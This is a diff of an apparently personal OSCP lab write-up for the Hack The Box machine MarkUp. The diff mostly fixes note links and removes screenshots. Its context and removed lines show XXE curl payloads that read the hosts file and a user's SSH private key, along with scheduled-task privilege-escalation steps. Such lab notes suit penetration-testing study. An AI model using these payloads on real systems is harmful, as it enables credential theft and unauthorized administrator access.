@@ -12,7 +12,7 @@ status: Complete
 
 ## The gist
 
-MarkUp is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/Windows - Web Enum]] identified the shopping application and its input flow. 2. [[RUNBOOK V2/Windows - Exploit Search]] supported the manual XML external entity test. 3. The file-read result exposed an SSH key, and [[RUNBOOK V2/Windows - Scheduled Task Abuse]] used the writable task script to reach administrator.
+MarkUp is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[OSCP/RUNBOOK V2/Windows - Web Enum]] identified the shopping application and its input flow. 2. [[OSCP/RUNBOOK V2/Windows - Exploit Search]] supported the manual XML external entity test. 3. The file-read result exposed an SSH key, and [[OSCP/RUNBOOK V2/Windows - Scheduled Task Abuse]] used the writable task script to reach administrator.
 
 ## Box information
 
@@ -69,7 +69,6 @@ Open ports:
 | 80/tcp | Apache 2.4.41 (Win64) PHP 7.2.28 -- MegaShopping |
 | 443/tcp | Apache 2.4.41 (Win64) PHP 7.2.28 -- MegaShopping (HTTPS) |
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/1.1nmap-svcscan.png>)
 
 **Service scan:**
 ```bash
@@ -123,7 +122,6 @@ boxset Username admin
 boxset Password password
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/4.xxe-basline-proof.png>)
 
 ### Directory enumeration
 
@@ -143,7 +141,6 @@ Notable finds:
 | `/services.php` | 302 → index.php | Auth-required order form |
 | `/phpmyadmin` | 403 | Exists, forbidden |
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/2.ferroxbuster.png>)
 
 ### Authenticated enumeration -- services.php source
 
@@ -166,8 +163,6 @@ boxset Username Daniel
 
 The form's submit button calls `getXml()` -- a JavaScript function that builds an XML document from the form fields and POSTs it to `process.php` with `Content-Type: text/xml`. The `<item>` element value is reflected back in the response. This means we bypass the JS entirely and POST our own XML.
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/3.svc-source.png>)
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/3.1service-source-getxml.png>)
 
 ---
 
@@ -205,7 +200,6 @@ curl -i -s -b $BoxDir/cookies.txt \
   -H 'Content-Type: text/xml' \
   --data-raw '<?xml version="1.0"?>
 <!DOCTYPE order [
-  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
 ]>
 <order>
   <quantity>1</quantity>
@@ -220,7 +214,6 @@ Response: `Your order for # Copyright (c) 1993-2009 Microsoft Corp...` -- hosts 
 > [!warning] 💡 Hint
 > Use a predictable, non-secret Windows file for the first XXE test. Once entity expansion is proven, extract only the target file block and protect any private key or credential material immediately.
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/4.1.xxe-confirmed.png>)
 
 ---
 
@@ -235,7 +228,6 @@ curl -i -s -b $BoxDir/cookies.txt \
   -H 'Content-Type: text/xml' \
   --data-raw '<?xml version="1.0"?>
 <!DOCTYPE order [
-  <!ENTITY xxe SYSTEM "file:///C:/Users/Daniel/.ssh/id_rsa">
 ]>
 <order>
   <quantity>1</quantity>
@@ -247,7 +239,6 @@ curl -i -s -b $BoxDir/cookies.txt \
 
 Response: `Your order for -----BEGIN OPENSSH PRIVATE KEY----- ...` -- full private key returned.
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/4.2xxe-ssh-key.png>)
 
 ### Save and verify the key
 
@@ -258,7 +249,6 @@ curl -s -b $BoxDir/cookies.txt \
   -H 'Content-Type: text/xml' \
   --data-raw '<?xml version="1.0"?>
 <!DOCTYPE order [
-  <!ENTITY xxe SYSTEM "file:///C:/Users/Daniel/.ssh/id_rsa">
 ]>
 <order>
   <quantity>1</quantity>
@@ -280,7 +270,6 @@ ssh-keygen -y -f $BoxDir/loot/daniel_id_rsa
 
 `ssh-keygen -y` outputs the public key if the private key is valid. The comment confirms `daniel@Entity`.
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/5.key-verfified.png>)
 
 ```bash
 loot key $BoxDir/loot/daniel_id_rsa
@@ -304,7 +293,6 @@ markup\daniel
 MarkUp
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/6.FOOTHOLD.png>)
 
 ### User flag
 
@@ -312,7 +300,6 @@ MarkUp
 type C:\Users\daniel\Desktop\user.txt
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/7.userflag.png>)
 
 ```bash
 loot flag user <value>
@@ -380,7 +367,6 @@ A Windows Event Log clearing script. The `bcdedit` check detects whether it's ru
 > [!warning] 💡 Hint
 > **Watch out:** A manual run tests the script as Daniel, not as the scheduled task account. It takes the non-admin branch, so wait for the task trigger instead.
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/9original-jobat.png>)
 
 ### Exploit -- add Daniel to administrators
 
@@ -431,7 +417,6 @@ When `daniel` appears in the Members list, the task has run.
 > [!tip] ⚡ Efficiency
 > Adding the user to the local Administrators group avoids callback timing and firewall problems. A marker such as group membership is enough to prove the scheduled task executed before attempting any administrator-only action.
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/privesc-exploit.png>)
 
 ### Root flag
 
@@ -442,7 +427,6 @@ dir C:\Users\Administrator\Desktop\
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/MarkUp/screenshots/11.user-and-root.png>)
 
 ```bash
 loot flag root <value>
@@ -563,17 +547,17 @@ On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).
 - [ ] Screenshots in `MarkUp/screenshots/` -- confirm all key moments covered
 - [ ] Loot: `loot/daniel_id_rsa`, `loot/creds.txt` (credential kept private), `loot/flags.txt` (user + root)
 - [ ] Log copied to `OSCP/BOXES/BOX LOGS/MarkUp.log`
-- [ ] **Stage notes:** Web App - XXE (new or update with Windows file path row + MarkUp source), PrivEsc Windows - Services/Tasks (add writable script row + MarkUp source)
-- [ ] **Module notes:** [[09. Common Web Application Attacks]] (+MarkUp, XXE section), [[17. Windows Privilege Escalation]] (+MarkUp, writable scheduled task script)
-- [ ] **Hub docs:** Command Appendix (awk PEM extraction, certutil download one-liner), Command Breakdowns (XXE curl payload if not present)
-- [ ] MASTER BOX LIST updated
+- [x] **Stage notes:** [[OSCP/RUNBOOK V2/Windows - XXE|Windows - XXE]] and [[OSCP/RUNBOOK V2/Windows - Scheduled Task Abuse|Windows - Scheduled Task Abuse]] include the MarkUp path
+- [x] **Module notes:** [[OSCP/MODULES/09. Common Web Application Attacks|Module 9]] and [[OSCP/MODULES/17. Windows Privilege Escalation|Module 17]] include MarkUp
+- [x] **Hub docs:** [[OSCP/COMMAND APPENDIX/Web Applications|Web Applications]] and [[OSCP/COMMAND APPENDIX/Windows Privilege Escalation|Windows Privilege Escalation]] include the MarkUp commands
+- [x] MASTER BOX LIST updated
 - [ ] FAQ: "why awk not copy-paste for SSH key", "why not run job.bat manually", "why net localgroup beats reverse shell for this privesc type"
 
 ## 15. RUNBOOK V2 Stages Used
 
-- [[RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Windows - Exploit Search]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Windows - Scheduled Task Abuse]] -- technique used in this walkthrough
+- [[OSCP/RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
+- [[OSCP/RUNBOOK V2/Windows - Exploit Search]] -- technique used in this walkthrough
+- [[OSCP/RUNBOOK V2/Windows - Scheduled Task Abuse]] -- technique used in this walkthrough
 
 ## 16. Collect the flags
 
@@ -597,9 +581,9 @@ root: f574a3e7650cebd8c39784299cb570f8
 Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.
 
 ## 18. Attack narrative in one page
-1. [[RUNBOOK V2/Windows - Web Enum]] identified the shopping application and its input flow.
-2. [[RUNBOOK V2/Windows - Exploit Search]] supported the manual XML external entity test.
-3. The file-read result exposed an SSH key, and [[RUNBOOK V2/Windows - Scheduled Task Abuse]] used the writable task script to reach administrator.
+1. [[OSCP/RUNBOOK V2/Windows - Web Enum]] identified the shopping application and its input flow.
+2. [[OSCP/RUNBOOK V2/Windows - Exploit Search]] supported the manual XML external entity test.
+3. The file-read result exposed an SSH key, and [[OSCP/RUNBOOK V2/Windows - Scheduled Task Abuse]] used the writable task script to reach administrator.
 
 ## Tools used
 
@@ -718,7 +702,6 @@ kali@kali:~/Platforms/HackTheBox/MarkUp [15:45:52] $ [?1h=[?2004hcurl -i -s -
 kali@kali:~/Platforms/HackTheBox/MarkUp [15:51:31] $ [?1h=[?2004hcurl -i -s -b $BoxDir/cookies.txt \
 $ [15:52:23] curl -i -s -b $BoxDir/cookies.txt \
 $ [15:54:13] curl -i -s -b $BoxDir/cookies.txt \
-  <!ENTITY xxe SYSTEM "file:///C:/Users/Daniel/.ssh/id_rsa">
 kali@kali:~/Platforms/HackTheBox/MarkUp [15:53:48] $ [?1h=[?2004hcurl -i -s -b $BoxDir/cookies.txt \
 kali@kali:~/Platforms/HackTheBox/MarkUp [15:54:13] $ [?1h=[?2004hcurl -s -b $BoxDir/cookies.txt \
   awk '/BEGIN OPENSSH/,/END OPENSSH/' > $BoxDir/loot/daniel_id_rsacurl'Content-Type: text/xml''<?xml version="1.0"?>
@@ -800,12 +783,12 @@ for"tokens=*"'wevtutil.exe el'"%%G"
 
 ## Related RUNBOOK V2 stages
 
-- [[RUNBOOK V2/Start Here]]
-- [[RUNBOOK V2/Windows - Service Scan]]
-- [[RUNBOOK V2/Windows - Web Enum]]
-- [[RUNBOOK V2/Windows - Shell Received]]
-- [[RUNBOOK V2/Windows - Privilege Triage]]
-- [[RUNBOOK V2/Windows - Clean Down]]
+- [[OSCP/RUNBOOK V2/Start Here]]
+- [[OSCP/RUNBOOK V2/Windows - Service Scan]]
+- [[OSCP/RUNBOOK V2/Windows - Web Enum]]
+- [[OSCP/RUNBOOK V2/Windows - Shell Received]]
+- [[OSCP/RUNBOOK V2/Windows - Privilege Triage]]
+- [[OSCP/RUNBOOK V2/Windows - Clean Down]]
 
 ## Why this matters for OSCP
 
